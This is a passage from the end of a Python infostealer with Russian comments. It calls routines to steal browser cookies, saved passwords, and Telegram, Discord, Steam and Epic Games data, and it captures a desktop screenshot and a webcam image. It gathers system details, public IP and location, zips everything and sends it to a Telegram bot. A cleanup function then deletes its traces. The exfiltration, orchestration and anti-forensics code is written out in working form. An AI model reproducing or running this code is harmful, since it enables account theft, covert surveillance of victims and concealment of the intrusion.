            ]
            
            for folder in empty_folders:
                if folder.exists() and folder.is_dir():
                    # Создаем пустой файл-маркер
                    marker_file = folder / ".keep"
                    try:
                        marker_file.touch(exist_ok=True)
                        arcname = marker_file.relative_to(BASE_DIR)
                        zipf.write(str(marker_file), str(arcname))
                    except Exception as e:
                        debug_log(f"Не удалось создать маркер для {folder}: {e}")
            
        debug_log(f"Архив создан: {zip_path}")
        return zip_path
    except Exception as e:
        debug_log(f"Ошибка создания архива: {traceback.format_exc()}")
        return None

def send_to_telegram(zip_path):
    """Отправляет данные в Telegram в правильной последовательности"""
    try:
        # 1. Отправляем скриншот (если есть)
        if SCREENSHOT_PATH.exists():
            with open(str(SCREENSHOT_PATH), 'rb') as photo:
                bot.send_photo(
                    chat_id=TELEGRAM_CHAT_ID,
                    photo=photo,
                    caption="Скриншот рабочего стола"
                )
            time.sleep(1)

        # 2. Отправляем снимок с веб-камеры (если есть)
        if WEBCAM_PATH.exists():
            with open(str(WEBCAM_PATH), 'rb') as photo:
                bot.send_photo(
                    chat_id=TELEGRAM_CHAT_ID,
                    photo=photo,
                    caption="Снимок с веб-камеры"
                )
            time.sleep(1)

        # 3. Отправляем краткие сведения о системе
        sys_info = get_system_info()
        cpu_name = get_cpu_name()
        cpu_cores = f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)} (физич./логич.)"
        cpu_usage = f"{psutil.cpu_percent(interval=1)}%"
        
        summary = (
            "СИСТЕМНЫЙ ОТЧЕТ\n"
            f"• ОС: {sys_info['system']['os']} {sys_info['system']['version']}\n"
            f"• Пользователь: {sys_info['system']['username']}\n"
            f"• Процессор: {cpu_name}\n"
            f"• Ядра: {cpu_cores}\n"
            f"• Нагрузка: {cpu_usage}\n"
            f"• ОЗУ: {sys_info['hardware']['memory']['total_gb']} GB\n"
            f"• IP: {sys_info['network']['public_ip']}\n"
            f"• Местоположение: {sys_info['network']['location']}"
        )
        bot.send_message(TELEGRAM_CHAT_ID, summary)
        time.sleep(1)

        # 4. Проверяем размер архива перед отправкой
        if not zip_path or not zip_path.exists():
            bot.send_message(TELEGRAM_CHAT_ID, "Ошибка: архив не создан")
            return False
        
        zip_size = zip_path.stat().st_size / (1024 * 1024)  # Размер в МБ
        
        if zip_size > 50:
            bot.send_message(
                TELEGRAM_CHAT_ID,
                f"Размер архива превышает 50 МБ ({zip_size:.2f} МБ). "
                "Данные не будут отправлены."
            )
            return False

        # 5. Отправляем архив с данными
        with open(str(zip_path), 'rb') as f:
            bot.send_document(
                chat_id=TELEGRAM_CHAT_ID,
                document=f,
                caption="Полные данные системы, куки, пароли и данные приложений",
                timeout=120
            )
        debug_log("Данные успешно отправлены в Telegram")
        return True
    except Exception as e:
        debug_log(f"Ошибка отправки в Telegram: {traceback.format_exc()}")
        return False

def cleanup():
    """Очищает следы"""
    try:
        # Удаляем основную папку с данными
        if BASE_DIR.exists():
            shutil.rmtree(str(BASE_DIR), ignore_errors=True)
        
        # Удаляем lock-файл
        if LOCK_FILE.exists():
            LOCK_FILE.unlink()
            
        # Удаляем временные файлы
        for file in Path(tempfile.gettempdir()).iterdir():
            if file.name.startswith("temp_") and (file.name.endswith(".db") or file.name.endswith(".json")):
                try:
                    file.unlink()
                except:
                    pass
    except:
        pass

def main_workflow():
    """Основной рабочий процесс"""
    try:
        # Гарантированное создание папок
        create_directories()
        
        # Собираем системную информацию
        sys_info = get_system_info()
        with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
            json.dump(sys_info, f, indent=4, ensure_ascii=False)
        
        # Крадем куки
        steal_cookies()
        
        # Крадем пароли
        steal_passwords()
        
        # Крадем данные приложений
        steal_telegram_data()
        steal_discord_data()
        steal_steam_data()
        steal_epic_games_data()
        
        # Скриншот
        take_screenshot()
        
        # Снимок с веб-камеры
        capture_webcam()
        
        # Упаковываем и отправляем
        zip_file = create_zip()
        
        if zip_file:
            send_to_telegram(zip_file)
    except Exception as e:
        debug_log(f"Критическая ошибка в основном потоке: {traceback.format_exc()}")


if __name__ == "__main__":
    # Проверка блокировки
    if LOCK_FILE.exists():
        sys.exit()
    
    try:
        with open(str(LOCK_FILE), 'w') as f:
            f.write(str(os.getpid()))
    except:
        sys.exit()
    
    try:
        main_workflow()
        debug_log("[+] Готово")
    except Exception as e:
        debug_log(f"!!! Критическая ошибка: {traceback.format_exc()}")
        try:
            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)[:1000]}")
        except:
            pass
    finally:
        cleanup()
